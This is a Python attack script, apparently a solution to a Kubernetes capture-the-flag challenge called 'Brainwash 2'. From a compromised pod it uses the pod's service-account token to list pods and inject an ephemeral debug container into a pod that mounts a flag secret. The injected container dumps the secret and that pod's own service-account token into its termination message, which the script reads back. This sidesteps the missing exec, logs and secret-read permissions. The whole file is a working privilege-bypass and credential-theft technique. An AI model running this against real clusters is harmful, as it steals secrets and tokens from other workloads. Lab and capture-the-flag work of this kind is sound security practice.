"""Brainwash 2: read a mounted secret via an ephemeral-container side channel.

What:
    Runs inside the compromised `webapp` pod (post AimQL-RCE from brainwash) using the
    `ci-runner` service-account token. Enumerates every pod in `brainwash-mlops`,
    finds the one that mounts a secret volume whose name contains ``flag``
    (the `cert-agent` pod), and reads that secret (`flag2`).

Approach:
    `ci-runner` has `pods get/list` and `pods/ephemeralcontainers patch`, but NOT
    `exec`, `logs`, or `get secrets`. So we PATCH an ephemeral debug container into
    the target pod that mounts the secret volume read-only and dumps it into the
    container's termination message (`/dev/termination-log`) instead of stdout —
    the termination message is readable through the already-granted `pods/get`
    verb. The ephemeral container is PodSecurity-`restricted`-compliant or the
    admission controller would reject the patch.

Dependencies: stdlib only (talks to the kube-apiserver over plain urllib+ssl).
"""

import json
import random
import ssl
import string
import time
import urllib.error
import urllib.request

T = open("/var/run/secrets/kubernetes.io/serviceaccount/token").read().strip()
CA = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
API = "https://kubernetes.default.svc"
ctx = ssl.create_default_context(cafile=CA)


def api(path, method="GET", data=None, ctype="application/json"):
    body = json.dumps(data).encode() if data is not None else None
    req = urllib.request.Request(
        API + path,
        method=method,
        headers={"Authorization": "Bearer " + T, "Content-Type": ctype},
        data=body,
    )
    try:
        return 200, urllib.request.urlopen(req, context=ctx, timeout=25).read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:400]
    except Exception as e:
        return 0, "ERR " + str(e)


NS = "brainwash-mlops"
print("== flag1 (our pod) ==")
try:
    print(open("/flag.txt").read())
except Exception as e:
    print("err", e)

code, r = api(f"/api/v1/namespaces/{NS}/pods")
pods = json.loads(r)["items"]
# find the pod that mounts a secret volume named flag* and is NOT ours
target = None
for p in pods:
    for v in p["spec"].get("volumes", []):
        if (
            "secret" in v
            and "flag" in v["name"]
            and p["metadata"]["name"] != __import__("os").popen("hostname").read().strip()  # ty: ignore[deprecated]
        ):
            target = (p["metadata"]["name"], v["name"])
print("== target pod/vol ==", target)
if not target:
    print("no target")
    raise SystemExit
POD, VOL = target
EC = "dbg" + "".join(random.choices(string.ascii_lowercase, k=5))
patch = {
    "spec": {
        "ephemeralContainers": [
            {
                "name": EC,
                "image": "registry.internal.brainwash/base:v1",
                "command": [
                    "sh",
                    "-c",
                    "( echo F2:; cat /f/*; echo; echo TOK:; cat /var/run/secrets/kubernetes.io/serviceaccount/token ) > /dev/termination-log 2>&1; sleep 2",
                ],
                "volumeMounts": [{"name": VOL, "mountPath": "/f", "readOnly": True}],
                "terminationMessagePolicy": "File",
                "terminationMessagePath": "/dev/termination-log",
                "securityContext": {
                    "allowPrivilegeEscalation": False,
                    "capabilities": {"drop": ["ALL"]},
                    "runAsNonRoot": True,
                    "runAsUser": 10001,
                    "seccompProfile": {"type": "RuntimeDefault"},
                },
            }
        ]
    }
}
code, r = api(
    f"/api/v1/namespaces/{NS}/pods/{POD}/ephemeralcontainers",
    "PATCH",
    patch,
    "application/strategic-merge-patch+json",
)
print("== inject ==", code if code == 200 else r[:250])
for _i in range(25):
    time.sleep(3)
    code, r = api(f"/api/v1/namespaces/{NS}/pods/{POD}")
    if code != 200:
        continue
    for s in json.loads(r).get("status", {}).get("ephemeralContainerStatuses", []):
        if s["name"] == EC and "terminated" in s.get("state", {}):
            print("== EC TERMINATED MESSAGE ==")
            print(s["state"]["terminated"].get("message", "<empty>"))
            raise SystemExit
print("EC did not terminate in time")
